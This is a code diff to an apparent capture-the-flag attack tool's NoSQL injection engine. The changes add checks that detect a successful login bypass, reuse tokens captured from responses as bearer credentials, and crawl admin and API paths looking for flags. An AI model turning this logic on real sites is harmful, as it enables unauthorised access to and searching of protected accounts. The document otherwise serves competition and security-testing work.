@@ -311,49 +311,70 @@ class NoSQLInjectionEngine:
         payload_name: str,
         form_action: str,
     ) -> bool:
-        """Check if a response indicates successful authentication bypass."""
+        """Check if a response indicates successful authentication bypass.
+        Handles both HTML responses AND JSON API responses (Express/Node.js pattern).
+        """
         # Check for flags first
         flag_found = flag_checker(response.text, f"NoSQL Auth Bypass ({payload_name})")
+        if flag_found:
+            return True
 
-        # Check response indicators
         text_lower = response.text.lower()
         url_lower = response.url.lower()
 
-        # Positive auth bypass indicators
+        # ─── JSON API Response Detection (Express/Node.js pattern) ───
+        # Success: {"redirect": "/dashboard"} or {"token": "..."} or {"success": true}
+        # Failure: {"error": "Invalid credentials"} or {"message": "Wrong password"}
+        try:
+            json_resp = response.json()
+            if isinstance(json_resp, dict):
+                # Check for redirect field (Express auth success pattern)
+                if json_resp.get("redirect") or json_resp.get("redirectUrl") or json_resp.get("redirectTo"):
+                    print_info(f"JSON redirect detected: [bold green]{json_resp.get('redirect') or json_resp.get('redirectUrl') or json_resp.get('redirectTo')}[/bold green]")
+                    return True
+                # Check for token field (JWT auth success)
+                if json_resp.get("token") or json_resp.get("jwt") or json_resp.get("accessToken"):
+                    return True
+                # Check for explicit success field
+                if json_resp.get("success") is True or json_resp.get("authenticated") is True:
+                    return True
+                # Check for user/session data (means we're logged in)
+                if json_resp.get("user") or json_resp.get("session") or json_resp.get("profile"):
+                    return True
+                # Check for error field (means failure - return False)
+                if json_resp.get("error") or json_resp.get("message"):
+                    err = str(json_resp.get("error", json_resp.get("message", "")))
+                    if any(k in err.lower() for k in ["invalid", "wrong", "incorrect", "denied", "fail", "unauthorized", "not found"]):
+                        return False
+        except (ValueError, AttributeError):
+            pass  # Not a JSON response, continue with HTML checks
+
+        # ─── HTML Response Detection ───
         auth_success_indicators = [
             "welcome", "dashboard", "logged in", "logout", "profile",
             "admin", "flag", "secret", "success", "authenticated",
             "hello", "session", "account", "panel", "home"
         ]
-
-        # Negative indicators (still on login page)
         auth_fail_indicators = [
             "invalid", "incorrect", "wrong", "failed", "error",
             "try again", "unauthorized", "denied", "bad credentials"
         ]
 
-        # Check if we were redirected away from login
+        # Check HTTP redirect
         redirected = (
             response.history and len(response.history) > 0 and
             response.history[0].status_code in [301, 302, 303]
         )
 
-        # Check if response looks like an authenticated page
         has_success = any(ind in text_lower for ind in auth_success_indicators)
         has_failure = any(ind in text_lower for ind in auth_fail_indicators)
-
-        # URL changed from login to something else
         url_changed = "login" not in url_lower and "auth" not in url_lower
 
-        if flag_found:
-            return True
         if redirected and not has_failure:
             return True
         if has_success and not has_failure:
             return True
         if url_changed and not has_failure:
-            return True
-        if response.status_code == 200 and redirected:
             return True
 
         return False
@@ -366,35 +387,73 @@ class NoSQLInjectionEngine:
         flag_checker: Callable,
         state: Dict[str, Any],
     ):
-        """After successful auth bypass, spider the authenticated area for flags."""
+        """After successful auth bypass, spider the authenticated area for flags.
+        Handles JSON API redirect responses and HTML page crawling.
+        """
+        from urllib.parse import urlparse
         print_info("Spidering authenticated area for flags and secrets...")
+
+        # Derive the origin (scheme + host) from the base URL
+        parsed_base = urlparse(base_url)
+        origin = f"{parsed_base.scheme}://{parsed_base.netloc}"
 
         # Check the auth response itself
         flag_checker(auth_response.text, "Authenticated Page")
 
-        # Extract links from authenticated page
+        # ─── Extract redirect URL from JSON response ───
+        redirect_paths = []
+        try:
+            json_resp = auth_response.json()
+            if isinstance(json_resp, dict):
+                for key in ["redirect", "redirectUrl", "redirectTo", "url", "location", "next"]:
+                    val = json_resp.get(key)
+                    if val and isinstance(val, str):
+                        redirect_paths.append(val)
+                        print_info(f"Following JSON redirect: [bold cyan]{val}[/bold cyan]")
+                # Also check for token to use as auth
+                for key in ["token", "jwt", "accessToken", "access_token"]:
+                    val = json_resp.get(key)
+                    if val and isinstance(val, str):
+                        session.headers.update({"Authorization": f"Bearer {val}"})
+                        session.cookies.set("token", val)
+                        print_info(f"Using extracted auth token for subsequent requests")
+        except (ValueError, AttributeError):
+            pass
+
+        # ─── Build full URL list to spider ───
+        # Start with JSON redirects (highest priority)
+        spider_urls = []
+        for path in redirect_paths:
+            if path.startswith("http"):
+                spider_urls.append(path)
+            else:
+                spider_urls.append(f"{origin}{path}")
+
+        # Extract links from the auth response HTML (if it's HTML)
         links = re.findall(r'href=["\']([^"\']+)["\']', auth_response.text)
         links += re.findall(r'action=["\']([^"\']+)["\']', auth_response.text)
+        for link in links:
+            if link.startswith("http"):
+                spider_urls.append(link)
+            elif link.startswith("/"):
+                spider_urls.append(f"{origin}{link}")
 
         # Add common authenticated paths
         common_paths = [
             "/", "/dashboard", "/admin", "/profile", "/flag", "/secret",
-            "/home", "/panel", "/api/flag", "/api/user", "/api/admin",
-            "/admin/flag", "/user/profile", "/account",
+            "/home", "/panel", "/settings", "/account", "/user",
+            "/api/flag", "/api/user", "/api/admin", "/api/dashboard",
+            "/api/profile", "/api/data", "/api/secret",
+            "/admin/flag", "/user/profile", "/admin/dashboard",
         ]
+        for path in common_paths:
+            spider_urls.append(f"{origin}{path}")
 
+        # ─── Spider all URLs ───
         visited = set()
-        for link in links + common_paths:
-            if link.startswith("http"):
-                full_url = link
-            elif link.startswith("/"):
-                # Build from base
-                from urllib.parse import urlparse
-                parsed = urlparse(base_url)
-                full_url = f"{parsed.scheme}://{parsed.netloc}{link}"
-            else:
-                full_url = urljoin(auth_response.url, link)
+        second_level_links = []
 
+        for full_url in spider_urls:
             if full_url in visited:
                 continue
             visited.add(full_url)
@@ -402,12 +461,52 @@ class NoSQLInjectionEngine:
             try:
                 r = session.get(full_url, timeout=5, allow_redirects=True)
                 if r.status_code == 200:
-                    flag_checker(r.text, f"Authenticated Spider ({full_url})")
+                    found = flag_checker(r.text, f"Authenticated Spider ({full_url})")
 
-                    # Check for additional secrets in response
-                    if any(k in r.text.lower() for k in ["flag", "secret", "ctf{", "htb{", "picoctf{"]):
+                    # Check for flag patterns in both HTML and JSON responses
+                    text_lower = r.text.lower()
+                    if any(k in text_lower for k in ["flag", "secret", "ctf{", "htb{", "picoctf{", "flag{"]):
                         print_success(f"Potential flag content found at: [bold cyan]{full_url}[/bold cyan]")
 
+                    # Also try to parse JSON responses for embedded flags/data
+                    try:
+                        jr = r.json()
+                        if isinstance(jr, dict):
+                            # Recursively check all values
+                            for k, v in jr.items():
+                                if isinstance(v, str):
+                                    flag_checker(v, f"JSON field '{k}' at {full_url}")
+                                elif isinstance(v, list):
+                                    for item in v:
+                                        if isinstance(item, str):
+                                            flag_checker(item, f"JSON list '{k}' at {full_url}")
+                                        elif isinstance(item, dict):
+                                            for ik, iv in item.items():
+                                                if isinstance(iv, str):
+                                                    flag_checker(iv, f"JSON nested '{k}.{ik}' at {full_url}")
+                    except (ValueError, AttributeError):
+                        pass
+
+                    # Collect second-level links
+                    page_links = re.findall(r'href=["\']([^"\']+)["\']', r.text)
+                    for pl in page_links:
+                        if pl.startswith("/"):
+                            second_level_links.append(f"{origin}{pl}")
+                        elif pl.startswith("http"):
+                            second_level_links.append(pl)
+
+            except Exception:
+                pass
+
+        # ─── Spider second-level pages ───
+        for full_url in second_level_links:
+            if full_url in visited:
+                continue
+            visited.add(full_url)
+            try:
+                r = session.get(full_url, timeout=5, allow_redirects=True)
+                if r.status_code == 200:
+                    flag_checker(r.text, f"Authenticated L2 Spider ({full_url})")
             except Exception:
                 pass
 
